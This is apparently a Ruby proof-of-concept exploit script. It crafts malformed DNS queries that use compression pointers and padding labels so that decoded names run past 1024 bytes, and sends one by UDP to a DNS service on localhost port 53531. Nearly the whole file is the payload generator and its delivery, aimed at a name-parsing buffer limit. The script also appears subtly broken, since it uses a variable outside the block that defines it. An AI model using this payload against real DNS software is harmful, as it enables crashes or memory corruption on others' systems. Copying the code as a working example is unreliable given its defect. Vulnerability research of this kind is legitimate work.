#!/usr/bin/ruby

require 'socket'

def get_length(name)
  index = 0;
  namelen = 0
  str = ""
  hops = 0

  loop do
    c = name[index].ord
    #puts('index = %d, c = %x' % [index, c])

    if(c == 0x00)
      return str.length
    elsif((c & 0xc0) == 0x40)
      puts("We can't have a segment longer than 64 bytes!")
      puts(name.unpack("H*"))
      exit(1)
    elsif(c == 0xc0)
      index = name[index+1].ord - 0x0c
      hops += 1
      if(hops > 255)
        break
      end
    else
      namelen += c
      if(namelen + 1 > 1024)
        break
      end
      new = name[index + 1, c]
      if(new.length != c)
        puts("Couldn't read from the string! (expected: %d, read %d)" % [c, new.length])
        exit(0)
      end

      str += new + "."
      index += c + 1
    end
  end

  #puts(str.length)
  #puts(str)
  #
  return str.length
end

def to_dns(name)
  dns = [ rand(0xFFFF), # trn_id
          0, # flags
          1, # question count
          0, # answer count
          0, # auth count
          0, # add count
        ].pack("nnnnnn")
  dns += name

  return dns
end

def send_to(target, port, name)
  s = UDPSocket.new
  s.send(to_dns(name), 0, target, port)
end

def generate_label(size)
  return [size - 1].pack("C") + ("B" * (size - 1))
end

def generate_string(payload, desired_length)
  payload_length = 32

  best = 0

  32.step(1, -1) do |payload_length|
    if(desired_length < 1024)
      puts("too short!!")
      exit
    end

    if(payload.length > payload_length)
      puts("Payload is too long!")
    end

    2.upto(255 - 0x0c - payload_length) do |padding_length|
      padding = ""
      my_padding_length = padding_length
      loop do
        if(my_padding_length < 2)
          puts("Wound up in impossible situation :(")
          exit
        elsif(my_padding_length == 2)
          padding += "\x01A"
          break
        elsif(my_padding_length == 3)
          padding += "\x02AA"
          break
        else
          padding += "\x01A"
          my_padding_length -= 2
        end
      end

      bytes = payload
      while(bytes.length < payload_length)
        bytes += "X"
      end
      #puts("Bytes: " + bytes)

      str = padding + [bytes.length].pack("C") + bytes + "\xc0" + [padding.length + 0x0c].pack("C")

      len = get_length(str)

      puts("Payload length 0x%x and padding length of 0x%x => %d" % [payload_length, padding_length, len])
      if(len == desired_length)
        return str
      end

      if(len > best)
        best = len
      end
    end
  end

  puts("Couldn't find a combination that's the right length :( (best we found was %d)" % best)
  exit(0)
end

#str1 = "\x02ZZ\x20AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x0f"
1024.upto(10000) do |i|
  str2 = generate_string("", i)
end

#get_length(str1)
get_length(str2)

puts("Looks like we have %d (0x%x) bytes" % [get_length(str2), get_length(str2)])

send_to("localhost", 53531, str2)

